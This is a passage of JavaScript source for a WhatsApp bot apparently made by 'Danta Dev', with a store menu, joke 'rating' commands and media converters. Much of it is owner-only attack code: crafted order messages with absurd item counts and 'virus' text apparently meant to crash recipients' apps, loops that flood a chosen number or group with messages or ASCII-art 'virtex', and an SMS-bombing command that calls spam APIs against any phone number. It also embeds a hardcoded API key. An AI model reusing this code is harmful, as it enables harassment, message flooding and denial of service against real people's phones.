ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ`
danta.relayMessage(m.chat, order.message, text, {thumbnail: fs.readFileSync('./image/pict.jpg'),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync('./image/pict.jpg'),"itemCount":999999999,"status":"INQUIRY","surface":"CATALOG","message":` 💫Vxo⚡ `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
break*/
case 'troli': {
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/dantaganz.jpg') }, { upload: danta.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `Danta Dev${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./image/pict.jpg'),
"orderTitle": `DD BOT${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
danta.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'troli1': {
if (!isCreator) throw mess.owner
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await danta.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
	var troli = generateWAMessageFromContent(m.chat,{

	"orderMessage": {
 
	"orderId": "599519108102353",
 
	"thumbnail": thumb,
 
	"itemCount": 2022,
 
	"status": "INQUIRY",
 
	"surface": "CATALOG",
 
	"message": ` 😈𝚃𝙷𝙴 𝙹𝙾 𝙱𝙾𝚃 ${philips} ${ngazap(prefix)}`,
 
	"orderTitle": `${buttonvirus}`, // 
 
	"sellerJid": "6281276070065@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
	}
	},{quoted: {
	key: {
	fromMe: false,
	participant: 
	`0@s.whatsapp.net`, // Fake sender Jid
	remoteJid: "status@broadcast"
	},
	message: {
	orderMessage: {
	itemCount: 999999999, // Bug
	status: 1,
	surface: 1,
	message: `😈𝚃𝙷𝙴 𝙹𝙾 𝙱𝙾𝚃 `,
	orderTitle: '999999999', // Idk what this does
	sellerJid: `0@s.whatsapp.net` // Seller
	}
	}
	}, contextInfo:{}}) 
	danta.relayMessage(m.chat, troli.message, { messageId: troli.key.id, a})
	}
	}
	break
//case 'katailham': case 'kata ilham':
//anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/katailham?apikey=${LeysKey}`)
//reply(`*Random Kata Ilham*\n${anu.result}`)
//break
case 'katabijak': case 'bijak':
anu = await fetchJson(`https://api.lolhuman.xyz/api/random/katabijak?apikey=e9cc9fe61061b7b6a035856b`)
reply(`*Random Kata Ilham*\n${anu.result}`)
break
case 'virtexto' : {
if (!isCreator) throw mess.owner
if (!text) throw `Contoh : Virtexto 628xxxxx`
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await danta.sendMessage(m.chat, {react: { text: " ï¸", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
danta.sendMessage(Pe, {text: "DANTA EXE"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA EXE"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA EXE"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA EXE"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA EXE"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA EXE"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA EXE"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA EXE"}, {quoted: doc})
await sleep(20)
m.reply('done bos')
}
break
case 'store':{
menunya = `
[]
   FF
   ML
   PUBG
   CODM
[]
`
image = fs.readFileSync('./image/danta.jpg'),
danta.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: menunya })
}
break
case 'listitem':{
m.reply('Free Fire \n Pubg \n Ml \n Codm')
}
break
case 'payment':{
m.reply('Gopay \nDana \nShopePay')
}
break
case 'free fire': case 'ff': case 'pubg': case 'mobile legends': case 'ml': case 'codm':{
	m.reply('Ketik : Payment')
            }
            break
case 'gopay': case 'dana': case 'shopepay':{
	m.reply('Transfer Ke no \n Ini ya: 081356484612 \nJika Sudah Bayar Ketik DonePay')
	}
	break
case 'donepay':{
	if (!text) throw `contoh : ${prefix + command} id|jumlah topup|via apa|game apa`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Orderan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'ðŸ™THANKS SUDAH ORDER' }, type: 1 }]
            await danta.sendButtonText(ownernya, buttons, pjtxt, nyoutube, m, {mentions: ments})
            let akhji = `Pesan Terkirim \nKe Owner @${ownernya.split('@')[0]}\n*Terima Kasih PesananNyaðŸ™*\nOwner Akan Memeriksa Pembayaran\n Thanks Sudah Order`
            await danta.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments})
            }
            break
case 'sendvirtex' : {
if (!isCreator) throw mess.owner
if (!text) throw `Contoh : Sendvirtex 628xxxxx`
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await danta.sendMessage(m.chat, {react: { text: " ï¸", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
danta.sendMessage(Pe, {text: "DANTA Bot"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA Bot"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA Bot"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA Bot"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA Bot"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA Bot"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA Bot"}, {quoted: doc})
await sleep(20)
danta.sendMessage(Pe, {text: "DANTA Bot"}, {quoted: doc})
await sleep(10000)
}
break
case 'spamsms':
                    if (!isCreator) throw mess.owner
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam1?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam2?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam3?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam4?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam5?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam6?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam7?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam8?apikey=${lolkey}&nomor=${nomor}`)
                    reply("Success Mungkin bero")
                    break
case 'gantengcek':
                    N = `KE *GANTENGAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 😎`
                    reply(N)
                    break 
                    case 'cantikcek':
                    N = `KE *CANTIKAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}% 😁*`
                    reply(N)
                    break
                    case 'jelekcek':
                    N = `KE *J3L3K4N* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 🤢`
                    reply(N)
                    break 
                    case 'goblokcek':
                    N = `KE *GOBLOKAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 🤣`
                    reply(N)
                    break 
                    case 'begocek':
                    N = `KE *BEGO* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 😂`
                    reply(N)
                    break 
                    case 'pintercek': 
                    N = `KE *PINTARAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 😗`
                    reply(N)
                    break 
                    case 'jagocek': 
                    N = `KE *JAGOAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 💪`
                    reply(N)
                    break 
                    case 'nolepcek': 
                    N = `KE *NOLEPAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 🧐`
                    reply(N)
                    break 
                    case 'babicek': 
                    N = `KE *BABIAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 🤪`
                    reply(N)
                    break 
                    case 'bebancek':
                    N = `KE *BEBANAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 🤬`
                    reply(N)
                    break 
                    case 'baikcek': 
                    N = `KE *BAIKAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 😇`
                    reply(N)
                    break 
                    case 'jahatcek': 
                    N = `KE *JAHATAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 😈`
                    reply(N)
                    break 
                    case 'anjingcek': 
                    N = `KE *ANJINGAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 👀`
                    reply(N)
                    break                      
                    case 'haramcek':
                    N = `KE *HARAMAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 🥴`
                    reply(N)
                    break  
                    case 'kontolcek': 
                    N = `KE *KOMTOLAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 🙂`
                    reply(N)
                    break 
                    case 'pakboycek': 
                    N = `KE *PAKBOYZ* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 😏`
                    reply(N)
                    break 
                    case 'pakgirlcek':	
                    N = `KE *PAKGILR* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 😏`
                    reply(N)
                    break             
                    case 'sangecek':
                    N = `JIWA *SANGE* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 🤤`
                    reply(N)
                    break
                    case 'bapercek':
                    N = `JIWA *BEPERAN* KAMU\n`
                    N += `ADALAH : *${ferdantar3}${ferdantar4}%* 😘`
                    reply(N)
                    break
case 'wallpaper':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wallpaper2?apikey=${lolkey}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    danta.sendMessage(m.chat, ini_buffer, image, { quoted: m })
                    break
case 'bugbcimage': case 'bugbcvideo': case 'bugbcaudio': {
if (!isCreator) throw mess.owner
if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`
let anu = await store.chats.all().map(v => v.id)
let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./image/pict.jpg'), surface: 200, message: `Danta Dev`, orderTitle: 'Danta Dev', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
for (let i of anu) {
await sleep(1500)
let butoon = [{
urlButton: {
displayText: `INSTAGRAM`,
url: 'https://instagram.com/danta.dev'
}
},
{
quickReplyButton: {
displayText: 'MENU',
id: 'menu'
}
}]
let media = await danta.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
if (/webp/.test(mime)) {
danta.sendMessage(i, { sticker: { url: media } }, { quoted: doc })
} else if (/image/.test(mime)) {
let junn = `*_BROADCAST IMAGE_*${text ? '\n\n' + text : ''}`
danta.send5ButImg(i, junn, `${global.botname}`, buffer, butoon)
} else if (/video/.test(mime)) {
let junn = `*_BROADCAST VIDIO_*${text ? '\n\n' + text : ''}`
danta.sendMessage(i, {video: buffer, caption: `${junn}`}, { quoted: doc })
} else if (/audio/.test(mime)) {
danta.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : doc })
} else {
m.reply(`*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`)
}
await fs.unlinkSync(media)
}
m.reply(` *Send Broadcast To* ${anu.length} *Chats*`)
}
break

case 'momoto': { 
 if (!isCreator) throw mess.owner
if (!text) throw `Contoh : ${prefix + command} 628xxxxx`
momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
//.....▓..........ٮ..........▓
.........▓▓..........▓▓
`
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:virgamZ})
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:virgamZ})
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:virgamZ})
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:virgamZ})
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:virgamZ})
            await m.reply(`Berhasil Mengirim Virtex Momo Di Nomer ${text}`)
}
break
case 'helloto': {            
 if (!isCreator) throw mess.owner
if (!text) throw `Contoh : ${prefix + command} 628xxxxx`
halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
await danta.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:virgamZ})
await danta.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:virgamZ})
await danta.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:virgamZ})
await danta.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:virgamZ})
await danta.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:virgamZ})
await danta.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:virgamZ})
await danta.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:virgamZ})
await danta.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:virgamZ})
await danta.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:virgamZ})
await m.reply(`Berhasil Mengirim Virtex Hello Di Nomer ${text}`)
}
 break
case 'jadibug1': {
if (!isCreator) return
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
danta.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : doc })
}
break
//=================================================//
case 'jadibug2': {
if (!isCreator) return
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
danta.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${danta.user.name}.mp3`}, { quoted : doc})
}
break
//=================================================//
case 'jadibug3': {
if (!isCreator) return
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
danta.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:doc})
}
break
//=================================================//
case 'jadibug4': {
if (!isCreator) return
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await danta.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
danta.sendMessage(m.chat, { image: buffer }, { quoted: doc })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'jadibug5': {
if (!isCreator) return
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await danta.downloadAndSaveMediaMessage(quoted)
danta.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: doc })
} else if (/video/.test(mime)) {
anu = await danta.downloadAndSaveMediaMessage(quoted)
danta.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
}
}
break
case 'santetto': { 
          if (!isCreator) throw mess.owner
          if (!text) throw `Nomernya mana?`
             dpaaganz7 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `  INFINITE`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
